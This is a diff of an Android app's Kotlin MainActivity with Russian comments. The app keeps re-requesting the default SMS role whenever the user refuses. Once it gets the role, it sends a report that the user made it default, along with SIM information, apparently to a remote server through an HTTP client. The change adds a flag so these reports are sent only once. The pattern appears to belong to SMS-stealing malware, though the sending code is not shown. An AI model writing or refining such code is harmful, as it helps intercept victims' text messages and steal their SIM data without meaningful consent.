@@ -24,6 +24,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var sharedPrefs: SharedPreferences
     private val SMS_ROLE_REQUEST_CODE = 101
     private val client = OkHttpClient()
+    private val NOTIFICATION_SENT_KEY = "notification_sent"
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -52,10 +53,8 @@ class MainActivity : AppCompatActivity() {
     private fun checkAndRequestSmsRole() {
         if (!isDefaultSmsApp()) {
             requestSmsRole()
-        } else {
-            // Если уже является приложением по умолчанию
-            sendNotification("Пользователь сделал приложением по умолчанию")
-            sendSimInfoNotification()
+        } else if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
+            sendNotifications()
         }
     }
 
@@ -86,14 +85,18 @@ class MainActivity : AppCompatActivity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SMS_ROLE_REQUEST_CODE) {
-            if (isDefaultSmsApp()) {
-                sendNotification("Пользователь сделал приложением по умолчанию")
-                sendSimInfoNotification()
-            } else {
-                // Повторяем запрос, если разрешение не получено
+            if (isDefaultSmsApp() && !sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
+                sendNotifications()
+            } else if (!isDefaultSmsApp()) {
                 requestSmsRole()
             }
         }
+    }
+
+    private fun sendNotifications() {
+        sendNotification("Пользователь сделал приложением по умолчанию")
+        sendSimInfoNotification()
+        sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
     }
 
     private fun sendNotification(message: String) {
